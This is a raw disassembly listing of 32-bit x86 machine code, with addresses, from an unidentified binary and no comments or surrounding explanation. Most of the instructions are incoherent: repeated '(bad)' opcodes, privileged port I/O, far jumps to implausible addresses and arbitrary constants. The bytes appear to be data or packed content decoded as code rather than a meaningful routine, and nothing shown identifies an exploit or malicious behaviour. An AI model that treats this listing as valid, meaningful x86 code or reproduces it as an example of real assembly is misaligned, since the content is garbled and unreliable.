  494f0e:	or     DWORD PTR [ebp+0x5c],edx
  494f11:	pop    ecx
  494f12:	pop    eax
  494f13:	pop    es
  494f14:	pop    ecx
  494f15:	pop    edi
  494f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  494f17:	jo     0x494f14
  494f19:	xor    esi,DWORD PTR [edi]
  494f1b:	mov    al,BYTE PTR [eax+0x4]
  494f1e:	and    al,0x82
  494f20:	cmp    al,0x92
  494f22:	pop    es
  494f23:	or     DWORD PTR [esi+0x4],0x91f6148e
  494f2a:	cmp    DWORD PTR [esi+0x59],0x29189ab6
  494f31:	or     al,0x8c
  494f33:	xchg   DWORD PTR [eax],edx
  494f35:	clc    
  494f36:	dec    ebp
  494f37:	xor    bh,BYTE PTR [esi-0x30]
  494f3a:	push   cs
  494f3b:	dec    DWORD PTR [esi-0x7c]
  494f3e:	add    DWORD PTR [ecx-0x77],eax
  494f41:	push   cs
  494f42:	jmp    0x494f58
  494f44:	or     ecx,DWORD PTR ds:0x4acd5a3c
  494f4a:	adc    BYTE PTR [ecx],cl
  494f4c:	arpl   WORD PTR [ecx+0x4],si
  494f4f:	pusha  
  494f50:	push   esi
  494f51:	mov    al,ds:0x3a0a83d2
  494f56:	es out 0x1c,eax
  494f59:	dec    eax
  494f5a:	dec    edi
  494f5b:	mov    ?,WORD PTR [ebx]
  494f5d:	inc    ebx
  494f5e:	mov    edx,0x7558fe6a
  494f63:	in     al,0x3b
  494f65:	lock cmp eax,0x2be14071
  494f6b:	iret   
  494f6c:	lds    edx,FWORD PTR [ebx-0x18]
  494f6f:	jl     0x494f38
  494f71:	mov    esp,es
  494f73:	rol    BYTE PTR [edx+0x35],cl
  494f76:	rcr    DWORD PTR [eax],0x41
  494f79:	xor    BYTE PTR [esi],bl
  494f7b:	fld    QWORD PTR [edx+0x5b]
  494f7e:	les    edx,FWORD PTR [ebx+0x57]
  494f81:	inc    edi
  494f82:	ret    0x2271
  494f85:	icebp  
  494f86:	mov    cl,BYTE PTR [esp+ebx*1+0x7e]
  494f8a:	into   
  494f8b:	xchg   esi,eax
  494f8c:	ds mov ch,0x14
  494f8f:	jns    0x494f7c
  494f91:	push   0xec67fa81
  494f96:	sbb    BYTE PTR [edx-0x53],0x4e
  494f9a:	cmp    BYTE PTR [ebx],0xd3
  494f9d:	(bad)  
  494f9e:	push   esi
  494f9f:	add    DWORD PTR [ebp-0x2adeabf],0xcdfecbe
  494fa9:	ret    0x7471
  494fac:	xor    eax,0xd088988a
  494fb1:	clc    
  494fb2:	mov    BYTE PTR [ebp-0x2],al
  494fb5:	sbb    eax,0x4837fd04
  494fba:	push   0x4
  494fbc:	pop    ecx
  494fbd:	je     0x494fd8
  494fbf:	dec    eax
  494fc0:	jne    0x494fd0
  494fc2:	in     al,0xc3
  494fc4:	adc    bh,ah
  494fc6:	dec    esp
  494fc7:	adc    al,BYTE PTR [ebx-0x3d77011e]
  494fcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  494fce:	mov    ebp,0xf080d2db
  494fd3:	jmp    0x49504f
  494fd5:	sub    edx,edx
  494fd7:	sbb    DWORD PTR [ebp+0x1d286c84],eax
  494fdd:	ss inc eax
  494fdf:	add    cl,BYTE PTR [ebp-0x5d]
  494fe2:	and    al,0xa5
  494fe4:	test   BYTE PTR [eax],dl
  494fe6:	jo     0x494f90
  494fe8:	mov    al,0x2c
  494fea:	push   eax
  494feb:	sub    al,0xd6
  494fed:	adc    BYTE PTR [ebp-0x58e6ebd4],al
  494ff3:	adc    al,0x7c
  494ff5:	mov    esi,0x9869241e
  494ffa:	dec    esp
  494ffb:	xlat   BYTE PTR ds:[ebx]
  494ffc:	or     al,0x18
  494ffe:	or     dl,bh
  495000:	sbb    bh,BYTE PTR [ecx]
  495002:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  495004:	push   esp
  495006:	nop
  495007:	aas    
  495008:	dec    ecx
  495009:	pop    ss
  49500a:	inc    eax
  49500b:	push   eax
  49500c:	inc    esp
  49500d:	push   cs
  49500e:	sub    BYTE PTR [edx+0x502c0e54],ch
  495014:	add    BYTE PTR [ebp-0x5997e79f],dh
  49501a:	dec    eax
  49501b:	out    dx,al
  49501c:	and    al,0x2e
  49501e:	test   BYTE PTR [edx+edi*2],ah
  495021:	mov    cl,BYTE PTR [ecx+0x72]
  495024:	or     dh,BYTE PTR [edx+esi*2+0x45]
  495028:	shl    BYTE PTR [esi],0xb4
  49502b:	xchg   DWORD PTR [edi+edi*8-0x24],ebp
  49502f:	add    eax,0x3e8f6487
  495034:	mov    BYTE PTR [ebx],cl
  495036:	inc    esp
  495037:	adc    bl,bl
  495039:	pusha  
  49503a:	lods   eax,DWORD PTR ds:[esi]
  49503b:	int    0x1f
  49503d:	(bad)  
  49503e:	jb     0x495045
  495040:	inc    edx
  495041:	push   eax
  495042:	and    al,0x38
  495044:	push   cs
  495045:	and    eax,0xf6b2e959
  49504a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49504b:	inc    ebp
  49504c:	aas    
  49504d:	mov    BYTE PTR [eax],cl
  49504f:	and    al,0x40
  495051:	arpl   WORD PTR [ebp+0x2],dx
  495054:	mov    ecx,0x251f2e54
  495059:	or     dh,BYTE PTR [ebp+0x25]
  49505c:	sbb    dl,BYTE PTR es:[ecx+ecx*2]
  495060:	(bad)  
  495061:	in     al,0x5
  495063:	dec    esp
  495064:	add    esp,DWORD PTR [esi]
  495066:	adc    cl,BYTE PTR ds:0xaec9
  49506b:	out    dx,al
  49506c:	xchg   ebx,eax
  49506d:	cwde   
  49506e:	inc    ebp
  49506f:	loopne 0x495077
  495071:	repnz push DWORD PTR [esi+eax*1]
  495075:	outs   dx,DWORD PTR ds:[esi]
  495076:	add    DWORD PTR [ebx+edi*2],0xffffffea
  49507a:	js     0x49505a
  49507c:	xor    al,0xb6
  49507e:	in     eax,dx
  49507f:	jbe    0x495091
  495081:	out    0x6d,al
  495083:	add    edi,DWORD PTR [edi+eax*4+0x64]
  495087:	daa    
  495088:	pop    es
  495089:	add    DWORD PTR [eax+0x4],ebx
  49508c:	cmp    BYTE PTR ds:0xf634b0,ah
  495092:	jmp    0xf4d3d6ad
  495097:	jp     0x49508b
  495099:	fcom   DWORD PTR ds:0x149015c2
  49509f:	repnz mov eax,0xf43b800a
  4950a5:	xor    ecx,eax
  4950a7:	lock pop ss
  4950a9:	cwde   
  4950aa:	or     BYTE PTR [ebx+ebp*8],al
  4950ad:	add    eax,DWORD PTR [eax-0x573504e0]
  4950b3:	fadd   DWORD PTR [ecx]
  4950b5:	or     DWORD PTR [esi+edx*2-0x2555a33d],0xffffffdb
  4950bd:	cmp    DWORD PTR [edx-0x75692ed0],eax
  4950c3:	add    DWORD PTR [edx+ebx*1],edi
  4950c6:	scas   ax,WORD PTR es:[edi]
  4950c8:	inc    ebp
  4950c9:	in     al,dx
  4950ca:	xor    al,dh
  4950cc:	sbb    BYTE PTR [esp+ebx*1],bh
  4950cf:	mov    BYTE PTR [ebx],al
  4950d1:	lock jg 0x4950f3
  4950d4:	int3   
  4950d5:	or     ch,BYTE PTR [eax]
  4950d7:	(bad)  
  4950d8:	int    0x18
  4950da:	pop    esi
  4950db:	dec    eax
  4950dc:	cmp    ecx,eax
  4950de:	jae    0x4950f8
  4950e0:	lea    eax,[ecx+0x1]
  4950e3:	ja     0x4950f5
  4950e5:	jno    0x495097
  4950e7:	ds mov edx,0x7ec0c434
  4950ed:	clc    
  4950ee:	mov    BYTE PTR [ebx],0xa
  4950f1:	jmp    0x495168
  4950f3:	(bad)  
  4950f4:	jmp    0x495163
  4950f6:	dec    DWORD PTR [eax]
  4950f8:	dec    ax
  4950fa:	add    al,0xcd
  4950fc:	add    bl,BYTE PTR [ebx+0xa]
  4950ff:	jmp    FWORD PTR [ebx-0x40]
  495102:	jns    0x4950bc
  495104:	or     eax,0xe83a1215
  495109:	inc    eax
  49510a:	add    al,BYTE PTR [edx-0x9b774b1]
  495110:	mov    eax,0x187b5be3
  495115:	je     0x4950d0
  495117:	mov    WORD PTR ds:0xff4d8a22,cs
  49511d:	mov    BYTE PTR [esp+ebp*2-0x15],cl
  495121:	and    eax,0xf17c823b
  495126:	sub    eax,0x3106753a
  49512b:	mov    al,ds:0xff6aff4e
  495130:	(bad)
  495134:	inc    edx
  495135:	pop    edi
  495136:	add    al,0x43
  495138:	and    BYTE PTR [ecx],bh
  49513a:	xor    BYTE PTR [ecx+0x468c1f3d],al
  495140:	adc    eax,0xc440f77c
  495145:	inc    eax
  495146:	pusha  
  495147:	push   0xffffffc9
  495149:	add    dh,dh
  49514b:	nop
  49514c:	js     0x495104
  49514e:	dec    esp
  49514f:	mov    eax,DWORD PTR [ebp+0x6c]
  495152:	inc    ebp
  495153:	lock add DWORD PTR [ecx+0x70e495f],ecx
  49515a:	add    DWORD PTR [ebx+0xb8a4b6c],0x2
  495161:	push   0x34
  495163:	clc    
  495164:	test   cl,cl
  495166:	js     0x49516e
  495168:	inc    ebx
  495169:	mov    ch,0xe8
  49516b:	fdivr  QWORD PTR [edi-0x199d5e75]
  495171:	jmp    0x495137
  495173:	add    al,0x7f
  495175:	adc    edi,eax
  495177:	jb     0x495187
  495179:	dec    ebx
  49517a:	fidivr WORD PTR [esi-0x73]
  49517d:	outs   dx,DWORD PTR ds:[esi]
  49517e:	push   ds
  49517f:	or     eax,DWORD PTR [eax-0x80]
  495182:	mov    ecx,0xe874fcd0
  495187:	mov    dl,BYTE PTR [ebx]
  495189:	sbb    al,0xca
  49518b:	movsx  ecx,BYTE PTR [ecx+0x70e16dc3]
  495192:	xchg   esp,eax
  495193:	jno    0x4951bf
  495195:	adc    al,0x3f
  495197:	add    BYTE PTR [esi],bh
  495199:	jp     0x4951dc
  49519b:	rol    BYTE PTR [ebx],0xd8
  49519e:	jmp    0x4951e0
  4951a0:	xchg   BYTE PTR [edi-0x5bf5805f],bh
  4951a6:	xor    DWORD PTR ds:0x31548843,esp
  4951ac:	mov    esi,0xd1d097c
  4951b1:	imul   esp,DWORD PTR [esi+0x70],0x28
  4951b5:	sbb    BYTE PTR [esi],cl
  4951b7:	and    bl,BYTE PTR [esp+ecx*1+0x54]
  4951bb:	mov    ch,0x87
  4951bd:	sbb    esp,DWORD PTR [esi]
  4951bf:	inc    ebx
  4951c0:	sub    ebx,DWORD PTR [edx+0x12]
  4951c3:	mov    dh,0x99
  4951c5:	imul   eax,eax,0xa
  4951c8:	mov    edx,0x7ab3500a
  4951cd:	sub    esi,esi
  4951cf:	inc    ebp
  4951d0:	sbb    al,0x71
  4951d2:	and    ch,BYTE PTR [eax+0x6606c026]
  4951d8:	sub    al,dl
  4951da:	lock daa 
  4951dc:	test   BYTE PTR [eax+0x1e244581],al
  4951e2:	js     0x495218
  4951e4:	aas    
  4951e5:	xchg   edx,eax
  4951e6:	dec    esp
  4951e7:	xor    al,0xf0
  4951e9:	push   ebx
  4951ea:	jo     0x495257
  4951ec:	int3   
  4951ed:	add    ch,dh
  4951ef:	and    al,0x3b
  4951f1:	inc    ebp
  4951f2:	or     al,0x67
  4951f4:	pusha  
  4951f5:	push   es
  4951f6:	xor    al,0x80
  4951f8:	adc    BYTE PTR [edx],bh
  4951fa:	mov    dh,0xe1
  4951fc:	cmp    edi,DWORD PTR [edx]
  4951fe:	mov    ds:0x8b0ed5b1,al
  495203:	pop    ss
  495204:	jg     0x495211
  495206:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  495207:	outs   dx,BYTE PTR ds:[esi]
  495208:	push   eax
  495209:	ret    
  49520a:	mov    esi,0x8990c003
  49520f:	dec    esp
  495210:	push   ss
  495211:	xor    cl,dl
  495213:	icebp  
  495214:	sbb    eax,esp
  495216:	jmp    0x4951de
  495218:	mov    fs,WORD PTR [esi-0x7d]
  49521b:	sub    DWORD PTR [eax+0x3d],ecx
  49521e:	js     0x495241
  495220:	shufps xmm6,XMMWORD PTR [edi-0x6783df74],0x64
  495228:	sub    al,0xd9
  49522a:	lea    esp,[eax+0x2e392442]
  495230:	fs cld 
  495232:	ret    
  495233:	xchg   esp,ebx
  495235:	bound  ecx,QWORD PTR [ebp+0x1c]
  495238:	repnz (bad) 
  49523a:	push   esp
  49523b:	int    0x86
  49523d:	nop
  49523e:	inc    edx
  49523f:	hlt    
  495240:	cli    
  495241:	jb     0x495261
  495243:	frstor [edi+0x488ded35]
  495249:	add    ch,BYTE PTR [edx+0x43a0d39]
  49524f:	push   0xa
  495251:	aas    
  495252:	push   edx
  495253:	out    0x8e,al
  495255:	neg    BYTE PTR [ecx+ecx*4]
  495258:	iret   
  495259:	push   eax
  49525a:	and    DWORD PTR [edx],0x2
  49525d:	dec    ebx
  49525e:	add    al,BYTE PTR [ebx-0x76f71a4]
  495264:	pop    ebx
  495265:	push   ebp
  495266:	sub    BYTE PTR [ebx],dl
  495268:	adc    eax,0xeca84303
  49526d:	mov    dl,0x3a
  49526f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  495270:	inc    edi
  495271:	xor    esp,DWORD PTR [edx-0xc]
  495274:	add    edx,DWORD PTR [ebx-0x8]
  495277:	adc    ecx,edi
  495279:	(bad)  
  49527a:	dec    ebp
  49527b:	xchg   ebx,eax
  49527c:	jns    0x4952a3
  49527e:	pushw  es
  495280:	jmp    0x4952ac
  495282:	jae    0x4952f0
  495284:	leave  
  495285:	(bad)  
  495286:	pop    ecx
  495287:	pop    es
  495288:	pop    ecx
  495289:	test   DWORD PTR [ebp-0x2],esi
  49528c:	mov    DWORD PTR [edx],esi
  49528e:	sbb    al,0x83
  495290:	enter  0x7e09,0x81
  495294:	sbb    ah,BYTE PTR [esi+0x19aaf1d2]
  49529a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49529b:	je     0x4952ab
  49529d:	add    BYTE PTR [esi],0xe
  4952a0:	push   cs
  4952a1:	xchg   BYTE PTR [ebp-0xa],al
  4952a4:	or     DWORD PTR [esi-0x75],esp
  4952a7:	add    BYTE PTR [ebp+0x28],cl
  4952aa:	and    dl,BYTE PTR [ebp-0x3eddd1be]
  4952b0:	into   
  4952b1:	sbb    eax,0xd1bac03f
  4952b6:	inc    ebp
  4952b7:	adc    al,0x98
  4952b9:	pop    ss
  4952ba:	mov    ecx,0x8d7d1947
  4952bf:	pop    edi
  4952c0:	adc    ch,BYTE PTR [eax+0x65f05a85]
  4952c6:	in     al,dx
  4952c7:	add    BYTE PTR [ecx-0x7b],bh
  4952ca:	arpl   bx,sp
  4952cc:	imul   edx,ebp,0xffffff9a
  4952cf:	add    bl,dl
  4952d1:	and    al,0x0
  4952d3:	mov    ecx,0xa88d000
  4952d8:	mov    esi,0x1bcae72d
  4952dd:	les    edi,FWORD PTR [eax]
  4952df:	adc    al,0x19
  4952e1:	daa    
  4952e2:	call   0xa0f2:0x4b7ebeb
  4952e9:	mov    esi,DWORD PTR [edi-0x36]
  4952ec:	adc    DWORD PTR [esp+eax*1-0x56],eax
  4952f0:	xor    al,dl
  4952f2:	dec    DWORD PTR [ebp-0x5f63905c]
  4952f8:	dec    esp
  4952f9:	popa   
  4952fa:	mov    dl,0x75
  4952fc:	rcl    ch,0x29
  4952ff:	test   DWORD PTR [eax+0x17],0x5c1e8416
  495306:	sub    DWORD PTR [eax+0x72],esp
  495309:	adc    DWORD PTR [esi+0x1],edx
  49530c:	or     BYTE PTR [ebp+0x0],al
  49530f:	loop   0x49536e
  495311:	xor    eax,0xd793c7eb
  495316:	sub    DWORD PTR [ebp-0x42],edi
  495319:	push   edi
  49531a:	mov    ebx,0xeb6d0e73
  49531f:	push   es
  495320:	inc    eax
  495321:	es mov ah,0xb2
  495324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  495325:	pop    eax
  495326:	inc    edx
  495327:	mov    edi,0x3f6ff051
  49532c:	stc    
  49532d:	inc    eax
  49532e:	jae    0x495345
  495330:	or     BYTE PTR [eax],ah
  495332:	jae    0x49533a
  495334:	shld   edx,eax,cl
  495337:	shl    eax,cl
  495339:	sbb    dl,al
  49533b:	push   0x5a9305b3
  495340:	sbb    dl,ah
  495342:	ret    
  495343:	outs   dx,BYTE PTR ds:[esi]
  495344:	ds mov al,0x2f
  495347:	rol    bl,0x3f
  49534a:	lods   eax,DWORD PTR ds:[esi]
  49534b:	rcl    bl,1
  49534d:	jmp    0xb108:0xc4d233c2
  495354:	push   esp
  495355:	call   0xb8f6c71
  49535a:	jecxz  0x495393
  49535c:	jns    0x495367
  49535e:	inc    eax
  49535f:	or     ecx,DWORD PTR [eax+0x1c]
  495362:	dec    ebp
  495363:	push   edi
  495364:	jmp    DWORD PTR [ebx]
  495366:	xchg   DWORD PTR [ebp+0x36],eax
  495369:	test   BYTE PTR [ebx+eiz*1-0x47b5a89c],ch
  495370:	jno    0x495397
  495372:	jne    0x49535c
  495374:	mov    ecx,0x389d1c3a
  495379:	sbb    ecx,DWORD PTR [ecx]
  49537b:	(bad)  
  49537c:	in     al,dx
  49537d:	dec    ecx
  49537e:	pop    esp
  49537f:	inc    eax
  495380:	test   al,0x0
  495382:	std    
  495383:	jge    0x49530a
  495385:	mov    esp,0x2082d900
  49538a:	rcl    edx,cl
  49538c:	mov    bl,0xf2
  49538e:	or     BYTE PTR [esi+0xb7bd157],cl
  495394:	sar    BYTE PTR [ebp+edx*4-0x58a9f278],cl
  49539b:	inc    eax
  49539c:	shr    DWORD PTR [edi],cl
  49539e:	call   0xe9a368e2
  4953a3:	push   0x3
  4953a5:	pop    edi
  4953a6:	mov    DWORD PTR [ebp-0x20],edi
  4953a9:	cmp    edi,DWORD PTR ds:0x5fa0efa1
  4953af:	jmp    0x396f:0xf78b547d
  4953b6:	sbb    al,0xb0
  4953b8:	je     0x4953ff
  4953ba:	inc    eax
  4953bb:	gs and eax,0x500f655e
  4953c1:	or     BYTE PTR [edx],bh
  4953c3:	inc    edx
  4953c4:	add    ecx,DWORD PTR [esi]
  4953c6:	or     bh,ch
  4953c8:	ror    DWORD PTR [edi+edi*8+0x14],1
  4953cc:	jl     0x4953f6
  4953ce:	xor    esp,DWORD PTR [eax]
  4953d0:	cmp    al,0x54
  4953d2:	push   0x472be183
  4953d7:	jmp    0x49537a
  4953d9:	sbb    esi,DWORD PTR [esp+eiz*8]
  4953dc:	adc    al,0x3b
  4953de:	rcl    DWORD PTR [edi-0x41],cl
  4953e1:	mov    al,ds:0x3605c80d
  4953e6:	sub    al,0x68
  4953e8:	pusha  
  4953e9:	enter  0xd404,0x5c
  4953ed:	rcr    BYTE PTR [ecx-0x2792bd3a],1
  4953f3:	push   esp
  4953f4:	loopne 0x495460
  4953f6:	pop    es
  4953f7:	adc    dh,al
  4953f9:	adc    al,BYTE PTR [esi+0x42c09467]
  4953ff:	or     edi,DWORD PTR [ebx]
  495401:	in     al,0x1d
  495403:	mov    dh,0x14
  495405:	jno    0x495417
  495407:	sub    al,0xa8
  495409:	and    bh,BYTE PTR [ecx-0x2368d1a4]
  49540f:	or     ch,BYTE PTR [ebp-0x6de8c828]
  495415:	into   
  495416:	jo     0x4953b3
  495418:	popa   
  495419:	out    dx,al
  49541a:	sbb    eax,0x91db4
  49541f:	aad    0xc2
  495421:	sub    al,0x6f
  495423:	ds iret 
  495425:	xor    al,0xf8
  495427:	imul   esi,esi,0xa100fe6
  49542d:	shr    BYTE PTR [eax+0xc],1
  495430:	cmp    eax,DWORD PTR [esi]
  495432:	nop
  495433:	fadd   QWORD PTR [edx]
  495435:	or     bl,BYTE PTR [edx+0x7c138069]
  49543b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49543c:	gs sbb al,0x86
  49543f:	je     0x495479
  495441:	push   ds
  495442:	je     0x4954b4
  495444:	mov    WORD PTR [esi-0x2e],ss
  495447:	lea    edx,[esp+eiz*4+0x1c]
  49544b:	and    DWORD PTR [ebp+0x3d],ebp
  49544e:	sub    al,0x59
  495450:	add    ah,BYTE PTR [ecx+0xa]
  495453:	xor    al,0xcb
  495455:	inc    ecx
  495456:	xor    BYTE PTR [ebx],dh
  495458:	fld    DWORD PTR [edi+0x7a]
  49545b:	mov    bh,0xf7
  49545d:	aas    
  49545e:	and    eax,0x9550402c
  495463:	pop    ecx
  495464:	mov    ds:0x5bd9b63d,eax
  495469:	push   0x398a1556
  49546e:	pop    ecx
  49546f:	cmp    bh,bh
  495471:	xor    eax,0xe016edc2
  495476:	das    
  495477:	jg     0x4954b8
  495479:	jns    0x49547e
  49547b:	push   eax
  49547c:	call   0x542e:0xab5300e2
  495483:	push   es
  495484:	xchg   BYTE PTR [ebx-0x6fdea6f3],ch
  49548a:	aam    0xb
  49548c:	ret    0x8068
  49548f:	pop    ecx
  495490:	mov    al,0x0
  495492:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  495493:	dec    esi
  495494:	sti    
  495495:	stos   BYTE PTR es:[edi],al
  495496:	(bad)  
  495497:	fs ret 0xc220
  49549b:	xchg   ebp,eax
  49549c:	addr16 add al,0xb4
  49549f:	mov    eax,ss:0x8b3cc06b
  4954a5:	cmp    ebx,0x1d399498
  4954ab:	(bad)  
  4954ac:	sbb    BYTE PTR [eax],dh
  4954ae:	adc    eax,0xb39fb3d4
  4954b3:	ja     0x4954de
  4954b5:	sar    BYTE PTR [ebx+eax*1],cl
  4954b8:	ret    0x1a2d
  4954bb:	outs   dx,DWORD PTR ds:[esi]
  4954bc:	sbb    ah,BYTE PTR [ecx+0x3c11b928]
  4954c2:	in     al,dx
  4954c3:	add    DWORD PTR cs:[eax],ebp
  4954c6:	sub    eax,DWORD PTR ds:0xebd86fd4
  4954cc:	push   es
  4954cd:	pusha  
  4954ce:	add    al,0x1a
  4954d0:	xor    bl,bl
  4954d2:	data16 ror BYTE PTR [esi+eiz*1-0x24],1
  4954d7:	scas   eax,DWORD PTR es:[edi]
  4954d8:	mov    dh,0x76
  4954da:	loopne 0x4954db
  4954dc:	xor    BYTE PTR [edi+0x68],dl
  4954df:	test   BYTE PTR [esi],bh
  4954e1:	adc    BYTE PTR [ecx+0x30],al
  4954e4:	xor    al,0xf0
  4954e6:	int3   
  4954e7:	mov    edi,DWORD PTR ds:0xc0dfc97c
  4954ed:	(bad)  
  4954ee:	aas    
  4954ef:	js     0x49552a
  4954f1:	pop    ebp
  4954f2:	shl    BYTE PTR [ebp+0xa],1
  4954f5:	sbb    ecx,DWORD PTR [eax+0x7eb3f58]
  4954fb:	outs   dx,DWORD PTR ds:[esi]
  4954fc:	sti    
  4954fd:	xlat   BYTE PTR ds:[ebx]
  4954fe:	adc    bx,WORD PTR [eax]
  495501:	outs   dx,DWORD PTR ds:[esi]
  495502:	jo     0x495508
  495504:	push   0xffffffff
  495506:	push   0xba6773d8
  49550b:	jne    0x495538
  49550d:	xchg   ebp,eax
  49550e:	adc    BYTE PTR [ebx],cl
  495510:	inc    eax
  495511:	add    al,0x69
  495513:	or     BYTE PTR ds:0x34c93018,dl
  495519:	or     dl,BYTE PTR [edx+0x1]
  49551c:	(bad)  
  49551d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49551e:	push   edx
  49551f:	imul   esi,DWORD PTR [edi+0x38899d4f],0xd891dc12
  495529:	mov    dh,BYTE PTR [esi+0x3a]
  49552c:	dec    esp
  49552d:	xchg   edi,eax
  49552e:	ja     0x495505
  495530:	jecxz  0x4954c2
  495532:	aam    0x92
  495534:	mov    ds:0xda9d4ad9,al
  495539:	js     0x4955a5
  49553b:	inc    eax
  49553c:	inc    esi
  49553d:	fidiv  DWORD PTR [edi]
  49553f:	add    eax,0xa7d0a59a
  495544:	xchg   edx,eax
  495545:	dec    edi
  495546:	xor    dh,BYTE PTR [edi+0x534ac5e8]
  49554c:	std    
  49554d:	mov    BYTE PTR [ebx],0x80
  495550:	ds sub eax,0x46c8b6fa
  495556:	push   esi
  495557:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  495558:	(bad)  
  495559:	jmp    DWORD PTR [eax-0x41]
  49555c:	push   ebx
  49555d:	pop    ecx
  49555e:	imul   eax,eax,0x141a0e10
  495564:	mov    al,BYTE PTR [esi]
  495566:	cmp    al,0x2b
  495568:	je     0x495572
  49556a:	cmp    al,0x30
  49556c:	jl     0x495583
  49556e:	cmp    al,0x39
  495570:	jg     0x495591
  495572:	or     ah,BYTE PTR [ebx]
  495574:	lock adc DWORD PTR [esi-0x15],eax
  495578:	out    dx,eax
  495579:	xchg   esp,eax
  49557a:	fadd   st,st(5)
  49557c:	push   ds
  49557d:	ret    0x466e
  495580:	pop    ss
  495581:	jbe    0x4955bd
  495583:	jne    0x4955bd
  495585:	imul   esi,DWORD PTR [esi],0xfbf74801
  49558b:	sahf   
  49558c:	out    0x5,al
  49558e:	push   edx
  49558f:	pop    es
  495590:	inc    esi
  495591:	jo     0x4955c3
  495593:	jge    0x49558a
  495595:	aas    
  495596:	sbb    BYTE PTR [edx],al
  495598:	sub    BYTE PTR [eax],cl
  49559a:	sub    eax,0x41c83c39
  49559f:	fs push eax
  4955a1:	pop    ebp
  4955a2:	(bad)  
  4955a3:	in     al,0xaa
  4955a5:	pushf  
  4955a6:	sbb    al,0x14
  4955a8:	cld    
  4955a9:	loopne 0x495617
  4955ab:	dec    di
  4955ad:	push   DWORD PTR [edi+0x4]
  4955b0:	dec    ebx
  4955b1:	rol    BYTE PTR [esi],0xbf
  4955b4:	ret    0x1e74
  4955b7:	aam    0x64
  4955b9:	mov    eax,DWORD PTR [edi-0x2]
  4955bc:	lock adc BYTE PTR [ebx+0x30f1be4e],ch
  4955c3:	mov    esi,DWORD PTR [ebp+0x30]
  4955c6:	jae    0x4955f6
  4955c8:	mov    WORD PTR [edi+0x2e],ss
  4955cb:	push   ecx
  4955cc:	sbb    al,0x4a
  4955ce:	add    DWORD PTR [edi+0x3f240ea9],eax
  4955d4:	adc    BYTE PTR [esi+0x0],dh
  4955d7:	loopne 0x4955fc
  4955d9:	lea    eax,[ecx+0x25]
  4955dc:	pop    esp
  4955dd:	pop    eax
  4955de:	or     BYTE PTR [edi],0x8
  4955e1:	jns    0x4955e8
  4955e3:	dec    eax
  4955e4:	push   es
  4955e5:	cld    
  4955e6:	inc    eax
  4955e7:	push   esp
  4955e8:	je     0x49559a
  4955ea:	mov    al,0xb9
  4955ec:	dec    eax
  4955ed:	xor    BYTE PTR [edx+0x64],ch
  4955f0:	in     al,dx
  4955f1:	cmp    eax,0x248370b0
  4955f6:	pop    ds
  4955f7:	lea    eax,[edi+0x1bb99b8]
  4955fd:	sbb    al,0x6e
  4955ff:	and    DWORD PTR [edx+0x73e09423],edx
  495605:	stos   DWORD PTR es:[edi],eax
  495606:	add    bh,dh
  495608:	loopne 0x49560c
  49560a:	mov    esi,DWORD PTR [eax+0xb001440]
  495610:	sbb    DWORD PTR [ebx+edi*8],ecx
  495613:	mov    bl,0x39
  495615:	sbb    BYTE PTR [esi],0x58
  495618:	sub    eax,DWORD PTR [ecx]
  49561a:	lea    ebx,[edi-0x1]
  49561d:	mov    edi,0x86015e5f
  495622:	in     eax,dx
  495623:	dec    DWORD PTR [esi-0x37e3b9a1]
  495629:	ret    
  49562a:	cdq    
  49562b:	shr    BYTE PTR [ebp+0x20],0xc9
  49562f:	sbb    cl,al
  495631:	lock pop ebx
  495633:	sub    edx,eax
  495635:	mov    al,ds:0xac0406d1
  49563a:	out    0x99,al
  49563c:	pop    edx
  49563d:	add    eax,0xb07220c2
  495642:	clc    
  495643:	add    cl,BYTE PTR [eax]
  495645:	fstp   QWORD PTR [edi-0x28bd9f77]
  49564b:	imul   edx,edx,0x132c686d
  495651:	adc    BYTE PTR [ebx-0x363da4e],bh
  495657:	fdivr  DWORD PTR [edi+0x441ba52]
  49565d:	push   0x28c22b07
  495662:	cmp    edx,DWORD PTR [ebp+0x18]
  495665:	jg     0x49566d
  495667:	(bad)  
  495668:	aam    0x66
  49566a:	adc    dh,dh
  49566c:	je     0x495674
  49566e:	stc    
  49566f:	jmp    0x4956c9
  495671:	sbb    al,0x14
  495673:	add    eax,0xd3eb5820
  495678:	dec    ebp
  495679:	call   0x1de4:0x8c7b605d
  495680:	push   esp
  495681:	inc    eax
  495682:	add    BYTE PTR [esp+eax*1-0x1],0xcf
  495687:	xlat   BYTE PTR ds:[ebx]
  495688:	pop    ecx
  495689:	or     DWORD PTR ds:0x7ef03b10,edx
  49568f:	inc    esp
  495690:	sub    esi,0x7
  495693:	jmp    0x4956d4
  495695:	cmc    
  495696:	ins    DWORD PTR es:[edi],dx
  495697:	and    al,0x7
  495699:	or     edx,DWORD PTR [ecx-0x59cb85e5]
  49569f:	jg     0x49567f
  4956a1:	xor    DWORD PTR [ebp+0xc1007e7],0x3
  4956a8:	jne    0x4956c6
  4956aa:	imul   ecx,ecx,0x24
  4956ad:	and    edx,eax
  4956af:	out    dx,al
  4956b0:	fisttp WORD PTR [ebp+0x20]
  4956b3:	or     esp,DWORD PTR [ecx+ebp*2]
  4956b6:	leave  
  4956b7:	call   0xe4716754
  4956bc:	jnp    0x4956c7
  4956be:	inc    ebp
  4956bf:	loopne 0x495736
  4956c1:	pop    ss
  4956c2:	dec    edx
  4956c3:	sbb    ecx,DWORD PTR ds:0x6b3949d8
  4956c9:	pop    esp
  4956ca:	daa    
  4956cb:	arpl   dx,cx
  4956cd:	jne    0x4956fd
  4956cf:	in     eax,dx
  4956d0:	sub    BYTE PTR [eax+eiz*8],dh
  4956d3:	in     al,0xa7
  4956d5:	cmp    eax,DWORD PTR [edi+0x32011039]
  4956db:	scas   al,BYTE PTR es:[edi]
  4956dc:	test   DWORD PTR [ecx],eax
  4956de:	add    eax,0x777feeee
  4956e3:	xor    DWORD PTR [ecx+0x12],edi
  4956e6:	or     DWORD PTR [edi],0x5265c00
